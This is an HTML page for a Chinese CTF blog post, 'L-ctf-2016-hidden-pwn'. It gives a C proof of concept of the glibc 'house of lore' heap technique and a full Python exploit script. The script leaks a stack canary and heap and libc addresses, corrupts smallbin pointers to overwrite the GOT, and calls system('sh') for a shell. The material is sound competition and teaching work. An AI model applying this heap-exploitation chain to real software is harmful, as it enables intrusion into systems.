@@ -1,0 +1,741 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Pwnable,house-of-lore,unlink,x86-64," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="某比赛的自己出的pwnable，随手写一下记录一下
+
+Conclusionsmallbin在malloc时的unlink
+PoC of “house of lore”a = (char *)malloc(0x20);b = (char *)malloc(0x100);c = (char *)malloc(0x20);free(b);malloc(0x110);// &apos;A&apos; * 0x20 + l64">
+<meta property="og:type" content="article">
+<meta property="og:title" content="L-ctf-2016-hidden-pwn">
+<meta property="og:url" content="http://0byjwzsf.me/2016/10/06/L-ctf-2016-hidden-pwn/index.html">
+<meta property="og:site_name" content="Icemakr's Blog">
+<meta property="og:description" content="某比赛的自己出的pwnable，随手写一下记录一下
+
+Conclusionsmallbin在malloc时的unlink
+PoC of “house of lore”a = (char *)malloc(0x20);b = (char *)malloc(0x100);c = (char *)malloc(0x20);free(b);malloc(0x110);// &apos;A&apos; * 0x20 + l64">
+<meta property="og:updated_time" content="2016-10-06T05:00:17.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="L-ctf-2016-hidden-pwn">
+<meta name="twitter:description" content="某比赛的自己出的pwnable，随手写一下记录一下
+
+Conclusionsmallbin在malloc时的unlink
+PoC of “house of lore”a = (char *)malloc(0x20);b = (char *)malloc(0x100);c = (char *)malloc(0x20);free(b);malloc(0x110);// &apos;A&apos; * 0x20 + l64">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://0byjwzsf.me/2016/10/06/L-ctf-2016-hidden-pwn/"/>
+
+  <title> L-ctf-2016-hidden-pwn | Icemakr's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?5ae83853fc19f40e51b4490ceb76aa1d";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Icemakr's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">focus your minds</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="st-search-show-outputs">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <form class="site-search-form">
+  <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+</form>
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'Rp7ZqqNxwbocZekuUGSB','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                L-ctf-2016-hidden-pwn
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-10-06T00:00:00+08:00" content="2016-10-06">
+              2016-10-06
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/10/06/L-ctf-2016-hidden-pwn/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/10/06/L-ctf-2016-hidden-pwn/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>某比赛的自己出的pwnable，随手写一下记录一下</p>
+</blockquote>
+<h1 id="Conclusion">Conclusion</h1><p>smallbin在malloc时的unlink</p>
+<h2 id="PoC_of_“house_of_lore”">PoC of “house of lore”</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">b = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">c = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x110</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 'A' * 0x20 + l64(0x0) + l64(0x110) + l64(0x0) + l64(d)</span></span><br><span class="line"><span class="comment">// get_str(a, 0x28, '\n');</span></span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;a[<span class="number">4</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)<span class="number">0x0</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;a[<span class="number">5</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)<span class="number">0x111</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;a[<span class="number">6</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)<span class="number">0x0</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;a[<span class="number">7</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)d;         <span class="comment">// return this</span></span><br><span class="line"></span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;d[<span class="number">0</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)<span class="number">0x0</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;d[<span class="number">1</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)<span class="number">0x111</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;d[<span class="number">2</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)(&amp;a[<span class="number">4</span> * <span class="number">8</span>]);</span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;d[<span class="number">3</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)(d + <span class="number">4</span> * <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;d[<span class="number">4</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)<span class="number">0x0</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;d[<span class="number">5</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)<span class="number">0x111</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(&amp;d[<span class="number">6</span> * <span class="number">8</span>]) = (<span class="keyword">long</span>)d;</span><br><span class="line"></span><br><span class="line"><span class="comment">// return d</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, <span class="built_in">malloc</span>(<span class="number">0x100</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, <span class="built_in">malloc</span>(<span class="number">0x100</span>));</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64, urllib2, os, time</span><br><span class="line"></span><br><span class="line"><span class="comment"># attack pseudo-random</span></span><br><span class="line">target = (<span class="string">'172.16.0.104'</span>, <span class="number">2333</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span><span class="params">()</span>:</span></span><br><span class="line">    local = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            leak        = int(os.popen(<span class="string">'./leak '</span> + str(int(time.time()))).read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            date        = urllib2.urlopen(<span class="string">'http://172.16.0.104'</span>).headers[<span class="string">'Date'</span>]</span><br><span class="line">            leak_time   = int(time.mktime(time.strptime(date, <span class="string">'%a, %d %b %Y  %H:%M:%S %Z'</span>)))</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'hello'</span></span><br><span class="line">            leak_time   += random.randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">print</span> leak_time</span><br><span class="line">            leak        = int(os.popen(<span class="string">'./leak '</span> + str(int(leak_time))).read())</span><br><span class="line">        <span class="keyword">if</span> leak ^ <span class="number">0x40000000</span> &gt;= <span class="number">0x40000000</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] random leak\t:\t'</span> + hex(leak)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io  = zio(<span class="string">'./pwn'</span>, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'red'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line">    io.hint([<span class="number">0x400fe8</span>, <span class="number">0x4022ec</span>])</span><br><span class="line"></span><br><span class="line">    adr_fake = <span class="number">0x604140</span></span><br><span class="line">    got = <span class="number">0x604000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># login</span></span><br><span class="line">    io.wl(base64.b64encode(<span class="string">'AAAAB'</span>))</span><br><span class="line">    io.rtl(<span class="string">'id?'</span>)</span><br><span class="line"></span><br><span class="line">    canary = leak_canary()</span><br><span class="line"></span><br><span class="line">    io.wl(<span class="string">'A'</span> * <span class="number">0x20</span>)</span><br><span class="line">    io.rtl(<span class="string">'A'</span> * <span class="number">0x20</span>)</span><br><span class="line">    heap_base = l64(io.rtl(<span class="string">','</span>)[:-<span class="number">1</span>].ljust(<span class="number">0x8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] heap base : 0x%x'</span> % heap_base</span><br><span class="line">    io.rtl(<span class="string">"hello?"</span>)</span><br><span class="line">    payload  = l64(<span class="number">0x0</span>)</span><br><span class="line">    payload += l64(<span class="number">0xb1</span>)</span><br><span class="line">    payload += l64(heap_base + <span class="number">0xe0</span>)</span><br><span class="line">    payload += l64(adr_fake + <span class="number">4</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    payload += l64(<span class="number">0x0</span>)</span><br><span class="line">    payload += l64(<span class="number">0xb1</span>)</span><br><span class="line">    payload += l64(adr_fake)</span><br><span class="line"></span><br><span class="line">    io.wl(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># malloc [0] [1] [2]</span></span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    io.wls([<span class="number">1</span>, <span class="number">1</span>, <span class="string">'AAAA'</span>, <span class="string">'DDDD'</span>])</span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    io.wls([<span class="number">1</span>, <span class="number">1</span>, <span class="string">'AAAA'</span>, <span class="string">'DDDD'</span>])</span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    io.wls([<span class="number">1</span>, <span class="number">1</span>, <span class="string">'AAAA'</span>, <span class="string">'DDDD'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free [1]</span></span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    io.wls([<span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># serial malloc a larger chunk</span></span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    io.wls([<span class="number">5</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">0x8</span></span><br><span class="line">    payload += l64(heap_base + <span class="number">0x80</span>)</span><br><span class="line">    payload += l64(<span class="number">0x0</span>)</span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">0x10</span></span><br><span class="line">    payload += l64(heap_base + <span class="number">0xa0</span>)</span><br><span class="line">    payload += l64(heap_base + <span class="number">0x60</span>)</span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">0x10</span></span><br><span class="line">    payload += l64(got - <span class="number">0x10</span>)</span><br><span class="line">    payload += l64(heap_base + <span class="number">0x80</span>)</span><br><span class="line">    payload  = payload.ljust(<span class="number">0x60</span>, <span class="string">'A'</span>)</span><br><span class="line">    payload += l64(canary)          <span class="comment"># canary</span></span><br><span class="line"></span><br><span class="line">    payload  = payload.ljust(<span class="number">0x88</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">    payload += l64(<span class="number">0x0</span>)</span><br><span class="line">    payload += l64(<span class="number">0xb1</span>)</span><br><span class="line">    payload += l64(<span class="number">0x0</span>)</span><br><span class="line">    payload += l64(adr_fake)    <span class="comment"># fake bk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit [0] to overflow to [1]</span></span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    io.wls([<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">'AAAA'</span>, payload])</span><br><span class="line"></span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    io.wl(<span class="number">1</span>)</span><br><span class="line">    io.wl(<span class="string">'AAAA'</span>)</span><br><span class="line">    io.wl(<span class="string">'BBBB'</span>)</span><br><span class="line">    io.wl(<span class="string">'CCCC'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite head</span></span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    payload = <span class="string">'C'</span> * <span class="number">0x8</span> + l64(heap_base + <span class="number">0x60</span>) + l64(canary) + l64(<span class="number">0x0</span>)</span><br><span class="line">    io.wls([<span class="number">1</span>, <span class="number">1</span>, <span class="string">'BBBB'</span>, payload])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    io.wl(<span class="number">4</span>)</span><br><span class="line">    io.rtl(<span class="string">'[3]'</span>)</span><br><span class="line">    io.rtl(<span class="string">'description:'</span>)</span><br><span class="line">    adr_free    = l64(io.rl()[:-<span class="number">1</span>].ljust(<span class="number">0x8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">    off_free    = <span class="number">0x0000000000082df0</span></span><br><span class="line">    libc_base   =  adr_free - off_free</span><br><span class="line">    off_system  = <span class="number">0x0000000000046640</span></span><br><span class="line">    adr_system  = libc_base + off_system</span><br><span class="line">    off_read    = <span class="number">0x00000000000eb800</span></span><br><span class="line">    adr_read    = libc_base + off_read</span><br><span class="line">    off_print_c = <span class="number">0x0000000000109280</span></span><br><span class="line">    adr_print_c = libc_base + off_print_c</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] free: 0x%x'</span> % adr_free</span><br><span class="line"></span><br><span class="line">    io.rtl(<span class="string">'choice'</span>)</span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">0x28</span></span><br><span class="line">    payload += l64(adr_read)</span><br><span class="line">    payload  = payload.ljust(<span class="number">0x60</span>, <span class="string">'A'</span>)</span><br><span class="line">    payload += l64(canary)          <span class="comment"># canary</span></span><br><span class="line">    payload  = payload.ljust(<span class="number">0x78</span>, <span class="string">'A'</span>)</span><br><span class="line">    payload += l64(adr_print_c)</span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">0x8</span></span><br><span class="line">    payload += l64(adr_system)</span><br><span class="line"></span><br><span class="line">    io.wls([<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="string">'BBBB'</span>, payload])</span><br><span class="line">    io.wl(<span class="string">'sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">    io.itr()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wait'</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
+          
+            <a href="/tags/house-of-lore/" rel="tag">#house-of-lore</a>
+          
+            <a href="/tags/unlink/" rel="tag">#unlink</a>
+          
+            <a href="/tags/x86-64/" rel="tag">#x86-64</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/09/09/find_function/" rel="next" title="寻找ELF共享对象基址重置后内部函数的地址">
+                <i class="fa fa-chevron-left"></i> 寻找ELF共享对象基址重置后内部函数的地址
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/10/06/L-ctf-2016-pwn200/" rel="prev" title="L-ctf-2016-pwn200">
+                L-ctf-2016-pwn200 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/10/06/L-ctf-2016-hidden-pwn/"
+           data-title="L-ctf-2016-hidden-pwn" data-url="http://0byjwzsf.me/2016/10/06/L-ctf-2016-hidden-pwn/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/author.jpg"
+               alt="Icemakr" />
+          <p class="site-author-name" itemprop="name">Icemakr</p>
+          <p class="site-description motion-element" itemprop="description">感觉至上的梦想家</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">39</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Ic3makr" target="_blank" title="github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  github
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://bigtang.org" title="b1gtang" target="_blank">b1gtang</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://iret.xyz" title="silver" target="_blank">silver</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://math1as.com" title="math1as" target="_blank">math1as</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://http://o0xmuhe.me" title="muhe" target="_blank">muhe</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PoC_of_“house_of_lore”"><span class="nav-number">1.1.</span> <span class="nav-text">PoC of “house of lore”</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Icemakr</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"0byjwzsf"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
